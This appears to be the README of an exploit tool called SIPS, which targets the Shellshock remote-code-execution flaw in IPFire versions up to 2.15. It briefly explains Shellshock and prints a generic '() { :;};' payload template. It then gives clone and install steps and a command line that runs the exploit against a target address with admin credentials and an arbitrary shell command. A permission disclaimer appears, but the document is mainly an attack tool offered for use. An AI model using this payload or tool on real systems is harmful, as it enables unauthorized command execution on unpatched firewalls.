### [S]kunks [IP]Fire [S]hellshock
Remote Code Execution exploit via the Shell Shock vulnerability present in IPFire versions below 2.15 (Content Update 82). Not to be used illegally, and only on targets with express permission.

-------------

### What is a ShellShock vulnarability?

Found in the Unix bash shell, a ShellShock vulnerability arises from the fact that environment variables within bash that are in use by a web server are not properly sanitized before they are executed, allowing an attacker to send commands through a HTTP request and have the system interpret it as a command. The vulnerability stems from the fact that bash does not correctly handle commands that follow the setting a function within an environment variable.

```bash
env fake_variable='() { :;} ; <malicious command gets executed after setting the function>
```

This exploit concentrates on exploiting a shellshock vulnerability within IPFire <= 2.15 (82) and will allow an attacker to execute commands on the targets server.

### Installation
From within your Linux terminal, you can use the following command to download the program.

```bash
git clone https://github.com/0xskunk/IPFire-2.15-Shellshock-Exploit.git
```

We need to make sure you have the packages installed that the program requires before it will run.

First, install pip, which is a package manager for Python.
```bash
sudo apt install python3-pip
```

Then, we install the required libraries.
```bash
pip3 install colorama art requests urllib3
```

This is all the prerequisites you need! 

### Usage

SIPS makes use of the ArgParse library, meaning you can get the help menu to appear by typing:
```bash
python3 SIPS.py -h
```

And use the script like:

```bash
python3 SIPS.py 69.69.13.37 444 /cgi-bin/index.cgi admin p@ssw0rd 'whoami'
```

Make sure your positional arguments are in the order that the program requires when you run the exploit. Don't worry about adding http:// or https:// to the IP address - the program will add that for you.
